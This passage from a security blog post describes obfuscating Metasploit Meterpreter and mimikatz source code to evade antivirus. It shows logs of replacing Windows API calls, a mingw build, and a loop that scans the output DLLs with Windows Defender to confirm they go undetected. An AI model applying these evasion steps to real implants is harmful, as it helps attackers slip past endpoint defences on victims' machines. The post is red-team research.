'/extensions/kiwi/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_livessp.c', '/extensions/priv/tokendup.c', '/elevator/namedpipeservice.c', '/elevator/tokendup.c', '/extensions/stdapi/server/sys/power/power.c', '/extensions/extapi/ntds_jet.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_vault.c', '/extensions/stdapi/server/net/config/route.c', '/extensions/powershell/powershell_runner.cpp', '/metsrv/pivot_packet_dispatch.c', '/extensions/kiwi/mimikatz/modules/kull_m_crypto.c', '/extensions/powershell/powershell_bridge.cpp', '/extensions/kiwi/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_wdigest.c', '/extensions/extapi/wmi.c', '/extensions/kiwi/mimikatz/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_lunahsm.c', '/metsrv/packet_encryption.c', '/extensions/stdapi/server/sys/registry/registry.c', '/extensions/extapi/syskey.c', '/extensions/kiwi/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_cloudap.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_rpc.c', '/extensions/kiwi/mimikatz/mimilib/kfilt.c', '/extensions/kiwi/mimikatz/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_sccm.c', '/extensions/kiwi/mimikatz/modules/kull_m_ldap.c', '/ReflectiveDLLInjection/inject/src/Inject.c', '/extensions/kiwi/mimikatz/modules/kull_m_pipe.c', '/metsrv/remote_dispatch.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kerberos/kuhl_m_kerberos_pac.c', '/extensions/stdapi/server/resource/hook.c', '/extensions/networkpug/networkpug.c', '/extensions/kiwi/mimikatz/mimikatz/modules/ngc/kuhl_m_ngc.c', '/metsrv/base_inject.c', '/extensions/incognito/token_info.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_sr98.c', '/extensions/extapi/ntds.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_token.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_minesweeper.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_standard.c', '/extensions/kiwi/mimikatz/modules/kull_m_crypto_ngc.c', '/extensions/kiwi/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_dpapi.c', '/extensions/stdapi/server/ui/mouse.c', '/extensions/incognito/list_tokens.c', '/extensions/stdapi/server/general.c', '/ReflectiveDLLInjection/dll/src/ReflectiveDll.c', '/extensions/kiwi/mimikatz/mimilib/sekurlsadbg/kull_m_rpc_ms-credentialkeys.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kerberos/kuhl_m_kerberos_ticket.c', '/extensions/kiwi/mimikatz/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_cloudap.c', '/metsrv/scheduler.c', '/extensions/stdapi/server/net/socket/udp.c', '/extensions/stdapi/server/sys/process/in-mem-exe.c', '/metsrv/remote.c', '/extensions/stdapi/server/net/config/netstat.c', '/extensions/stdapi/server/net/config/interface.c', '/extensions/stdapi/server/audio/output.c', '/extensions/stdapi/server/sys/process/process.c', '/extensions/kiwi/mimikatz/modules/kull_m_string.c', '/extensions/lanattacks/lanattacks.c', '/extensions/lanattacks/TFTPserv.cpp', '/extensions/kiwi/mimikatz/mimilib/knp.c', '/extensions/kiwi/mimikatz/mimikatz/modules/crypto/kuhl_m_crypto_sc.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_privilege.c', '/extensions/kiwi/mimikatz/modules/kull_m_process.c', '/extensions/peinjector/libpefile.c', '/extensions/stdapi/server/net/socket/tcp_server.c', '/metsrv/list.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_crypto.c', '/extensions/kiwi/mimikatz/modules/rpc/kull_m_rpc_ms-pac.c', '/extensions/kiwi/mimikatz/modules/kull_m_memory.c', '/extensions/kiwi/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_ssp.c', '/extensions/stdapi/server/railgun/railgun.c', '/extensions/kiwi/mimikatz/mimikatz/modules/crypto/kuhl_m_crypto_extractor.c', '/extensions/kiwi/mimikatz/modules/rpc/kull_m_rpc_ms-dcom_IObjectExporter_c.c', '/extensions/kiwi/mimikatz/mimikatz/modules/dpapi/kuhl_m_dpapi_oe.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_iis.c', '/extensions/kiwi/mimikatz/modules/kull_m_dpapi.c', '/extensions/extapi/adsi_interface.cpp', '/extensions/stdapi/server/sys/process/memory.c', '/extensions/kiwi/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_credman.c', '/extensions/kiwi/mimikatz/mimilib/kdhcp.c', '/extensions/peinjector/peinjector_bridge.c', '/extensions/kiwi/mimikatz/modules/kull_m_token.c', '/extensions/priv/passwd.c', '/extensions/extapi/window.c', '/extensions/kiwi/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_tspkg.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_misc.c', '/metsrv/server_transport_named_pipe.c', '/extensions/extapi/wshelpers.c', '/extensions/unhook/apisetmap.c', '/extensions/stdapi/server/fs/dir.c', '/extensions/extapi/service.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_event.c', '/extensions/kiwi/mimikatz/modules/kull_m_net.c', '/extensions/stdapi/server/fs/mount_win.c', '/extensions/kiwi/mimikatz/mimilib/sekurlsadbg/kuhl_m_sekurlsa_nt6.c', '/extensions/stdapi/server/sys/process/ps.c', '/extensions/kiwi/mimikatz/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_chrome.c', '/extensions/stdapi/server/fs/file.c', '/extensions/priv/service.c', '/extensions/powershell/powershell.c', '/extensions/kiwi/mimikatz/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c', '/extensions/stdapi/server/fs/fs_win.c']
243it [00:32,  7.54it/s]
INFO:root:Done
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/metsrv/libloader.c -> Counter({'ZwWriteVirtualMemory': 3, 'NtCreateSection': 2, 'NtMapViewOfSection': 2})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/metsrv/base_inject.c -> Counter({'ZwWriteVirtualMemory': 2, 'NtQueueApcThread': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/metsrv/remote_thread.c -> Counter({'CreateRemoteThread': 2, 'ZwCreateThreadEx': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/metsrv/base_dispatch.c -> Counter({'ZwWriteVirtualMemory': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_misc.c -> Counter({'NtResumeProcess': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_process.c -> Counter({'NtResumeProcess': 2, 'NtSuspendProcess': 2})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_net.c -> Counter({'SamEnumerateDomainsInSamServer': 6, 'SamConnect': 3})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_lsadump.c -> Counter({'SamEnumerateDomainsInSamServer': 2, 'SamConnect': 2})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/kiwi/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c -> Counter({'NtResumeProcess': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/kiwi/mimikatz/modules/kull_m_memory.c -> Counter({'ReadProcessMemory': 1, 'ZwWriteVirtualMemory': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/kiwi/mimikatz/modules/kull_m_cabinet.c -> Counter({'GetTempFileNameA': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/kiwi/mimikatz/modules/kull_m_remotelib.c -> Counter({'CreateRemoteThread': 2})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/priv/tokendup.c -> Counter({'ZwWriteVirtualMemory': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/priv/passwd.c -> Counter({'ReadProcessMemory': 3, 'ZwWriteVirtualMemory': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/stdapi/server/sys/process/in-mem-exe.c -> Counter({'WriteProcessMemory': 3, 'NtUnmapViewOfSection': 3, 'ReadProcessMemory': 1, 'ZwWriteVirtualMemory': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/stdapi/server/sys/process/memory.c -> Counter({'ReadProcessMemory': 1, 'ZwWriteVirtualMemory': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/stdapi/server/sys/process/util.c -> Counter({'ZwWriteVirtualMemory': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/stdapi/server/sys/process/ps.c -> Counter({'ReadProcessMemory': 3})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/ReflectiveDLLInjection/dll/src/ReflectiveDll.c: 100%|███████████████████████████████████████████████| 535/535 [00:02<00:00, 227.82it/s]
INFO:root:Found 243 files with strings.
INFO:root:Found 18 files with suspicious API calls.
INFO:root:23/26 occurrences of WriteProcessMemory replaced.
INFO:root:2/4 occurrences of NtCreateSection replaced.
INFO:root:2/4 occurrences of NtMapViewOfSection replaced.
INFO:root:1/2 occurrences of NtQueueApcThread replaced.
INFO:root:1/5 occurrences of CreateRemoteThread replaced.
INFO:root:0/4 occurrences of NtResumeProcess replaced.
INFO:root:0/2 occurrences of NtSuspendProcess replaced.
INFO:root:0/8 occurrences of SamEnumerateDomainsInSamServer replaced.
INFO:root:2/2 occurrences of SamRidToSid replaced.
INFO:root:0/5 occurrences of SamConnect replaced.
INFO:root:4/4 occurrences of SamLookupDomainInSamServer replaced.
INFO:root:6/6 occurrences of SamOpenDomain replaced.
INFO:root:3/3 occurrences of SamOpenUser replaced.
INFO:root:1/1 occurrences of SamOpenGroup replaced.
INFO:root:1/1 occurrences of SamOpenAlias replaced.
INFO:root:1/1 occurrences of SamGetGroupsForUser replaced.
INFO:root:2/2 occurrences of SamGetAliasMembership replaced.
INFO:root:1/1 occurrences of SamGetMembersInGroup replaced.
INFO:root:1/1 occurrences of SamGetMembersInAlias replaced.
INFO:root:2/2 occurrences of SamEnumerateUsersInDomain replaced.
INFO:root:1/1 occurrences of SamEnumerateGroupsInDomain replaced.
INFO:root:1/1 occurrences of SamEnumerateAliasesInDomain replaced.
INFO:root:2/2 occurrences of SamLookupIdsInDomain replaced.
INFO:root:16/16 occurrences of SamCloseHandle replaced.
INFO:root:28/28 occurrences of SamFreeMemory replaced.
INFO:root:1/1 occurrences of SamQueryInformationUser replaced.
INFO:root:2/2 occurrences of SamSetInformationUser replaced.
INFO:root:1/1 occurrences of SamiChangePasswordUser replaced.
INFO:root:2/2 occurrences of SamLookupNamesInDomain replaced.
INFO:root:0/9 occurrences of ReadProcessMemory replaced.
INFO:root:0/1 occurrences of GetTempFileNameA replaced.
INFO:root:1/4 occurrences of NtUnmapViewOfSection replaced.
INFO:root:Writing output log file to /var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/output_result.log
make docker-x64 -j 8 ; say "Done"                                                                                                                                                                      18:18:34
-- The C compiler identification is GNU 9.3.0
-- Check for working C compiler: /usr/bin/x86_64-w64-mingw32-gcc
-- Check for working C compiler: /usr/bin/x86_64-w64-mingw32-gcc -- works
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Detecting C compile features
-- Detecting C compile features - done
-- Build Type not specified, defaulting to 'Release'.
-- The CXX compiler identification is GNU 9.3.0
-- Check for working CXX compiler: /usr/bin/x86_64-w64-mingw32-g++
-- Check for working CXX compiler: /usr/bin/x86_64-w64-mingw32-g++ -- works
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Detecting CXX compile features
-- Detecting CXX compile features - done
-- Configuring done
-- Generating done
-- Build files have been written to: /meterpreter/workspace/build/mingw-x64
make[1]: Entering directory '/meterpreter/workspace/build/mingw-x64'
make[2]: Entering directory '/meterpreter/workspace/build/mingw-x64'
make[3]: Entering directory '/meterpreter/workspace/build/mingw-x64'
Scanning dependencies of target jpeg
make[3]: Leaving directory '/meterpreter/workspace/build/mingw-x64'
make[3]: Entering directory '/meterpreter/workspace/build/mingw-x64'
[  0%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jaricom.c.obj
[  1%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jcapimin.c.obj
[  1%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jcapistd.c.obj
[  1%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jcarith.c.obj
[  2%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jccoefct.c.obj
[  2%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jccolor.c.obj
[  2%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jcdctmgr.c.obj
[  3%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jchuff.c.obj
[  3%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jcinit.c.obj
[  3%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jcmainct.c.obj
[  4%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jcmarker.c.obj
[  4%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jcmaster.c.obj
[  4%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jcomapi.c.obj
[  5%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jcparam.c.obj
[  5%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jcprepct.c.obj
[  6%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jcsample.c.obj
[  6%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jctrans.c.obj
[  6%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jdapimin.c.obj
[  7%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jdapistd.c.obj
[  7%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jdarith.c.obj
[  7%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jdatadst.c.obj
[  8%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jdatasrc.c.obj
[  8%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jdcoefct.c.obj
[  8%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jdcolor.c.obj
[  9%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jddctmgr.c.obj
[  9%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jdhuff.c.obj
[ 10%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jdinput.c.obj
[ 10%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jdmainct.c.obj
[ 10%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jdmarker.c.obj
[ 11%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jdmaster.c.obj
[ 11%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jdmerge.c.obj
[ 11%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jdpostct.c.obj
[ 12%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jdsample.c.obj
[ 12%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jdtrans.c.obj
[ 12%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jerror.c.obj
[ 13%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jfdctflt.c.obj
[ 13%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jfdctfst.c.obj
[ 14%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jfdctint.c.obj
[ 14%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jidctflt.c.obj
[ 14%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jidctfst.c.obj
[ 15%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jidctint.c.obj
[ 15%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jmemmgr.c.obj
[ 15%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jmemnobs.c.obj
[ 16%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jquant1.c.obj
[ 16%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jquant2.c.obj
[ 16%] Building C object jpeg/CMakeFiles/jpeg.dir/meterpreter/source/jpeg-8/jutils.c.obj
[ 17%] Linking C static library libjpeg.x64.a
make[3]: Leaving directory '/meterpreter/workspace/build/mingw-x64'
[ 17%] Built target jpeg
make[3]: Entering directory '/meterpreter/workspace/build/mingw-x64'
Scanning dependencies of target metsrv
make[3]: Leaving directory '/meterpreter/workspace/build/mingw-x64'
make[3]: Entering directory '/meterpreter/workspace/build/mingw-x64'
[ 17%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/base.c.obj
[ 17%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/base_dispatch.c.obj
[ 18%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/base_inject.c.obj
[ 18%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/channel.c.obj
[ 19%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/core.c.obj
[ 19%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/libloader.c.obj
[ 19%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/list.c.obj
[ 20%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/metapi.c.obj
[ 20%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/metsrv.c.obj
[ 20%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/packet_encryption.c.obj
[ 21%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/pivot_packet_dispatch.c.obj
[ 21%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/pivot_tree.c.obj
[ 21%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/remote.c.obj
[ 22%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/remote_dispatch.c.obj
[ 22%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/remote_thread.c.obj
[ 23%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/scheduler.c.obj
[ 23%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/server_pivot.c.obj
[ 23%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/server_pivot_named_pipe.c.obj
[ 24%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/server_setup.c.obj
[ 24%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/server_transport_named_pipe.c.obj
[ 24%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/server_transport_tcp.c.obj
[ 25%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/server_transport_winhttp.c.obj
[ 25%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/server_transport_wininet.c.obj
[ 25%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/thread.c.obj
[ 26%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/unicode.c.obj
[ 26%] Building C object metsrv/CMakeFiles/metsrv.dir/meterpreter/source/metsrv/zlib.c.obj
[ 27%] Linking C shared library metsrv.x64.dll
make[3]: Leaving directory '/meterpreter/workspace/build/mingw-x64'
[ 27%] Built target metsrv
make[3]: Entering directory '/meterpreter/workspace/build/mingw-x64'
...
```

### Antivirus testing and a cheat

Then, all the freshly compiled DLLs can be scanned with Windows Defender and `loadlibrary`:

```
➜  ~ for i in `ls /var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/output/*.dll` ; do  docker run -v /Users/vladimir/dev/av-signatures-finder:/home/toto/av-signatures-finder -v /tmp:/tmp -v /var:/var loadlibrary-working python3 /home/toto/av-signatures-finder/scan.py $i ; done
main(): Scanning /var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/output/ext_server_espia.x64.dll...
EngineScanCallback(): Scanning input
main(): Scanning /var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/output/ext_server_incognito.x64.dll...
EngineScanCallback(): Scanning input
main(): Scanning /var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/output/ext_server_priv.x64.dll...
EngineScanCallback(): Scanning input
main(): Scanning /var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/output/ext_server_stdapi.x64.dll...
EngineScanCallback(): Scanning input
main(): Scanning /var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/output/ext_server_unhook.x64.dll...
EngineScanCallback(): Scanning input
main(): Scanning /var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/output/metsrv.x64.dll...
EngineScanCallback(): Scanning input
...
➜  ~
```

Note: this only provides the antivirus detection status with the static engine, to test the hooks and the memory scans you have to go real-mode.

Of course, while we do have a clean detection score in the console output above, you probably won’t have the same results unless you customised your _ReflectiveLoader_ to not use the same ROT13 API hashes as the default one.

I think it really is a game changer to be able to test that rapidly a full chain like this: obfuscation, compilation and antivirus testing on the same machine, as part of a single script.

![](https://blog.scrt.ch/wp-content/uploads/2022/03/image-1024x442.png)

Now you know!

# Thanks

A big thank you to [@TheColonial](https://twitter.com/thecolonial) for looking at my huge pull request and building something so much better from it. I’ve seen the bugs you solved with _mingw_ and let’s just say…wow.

_Vladimir Meier / @plowsec_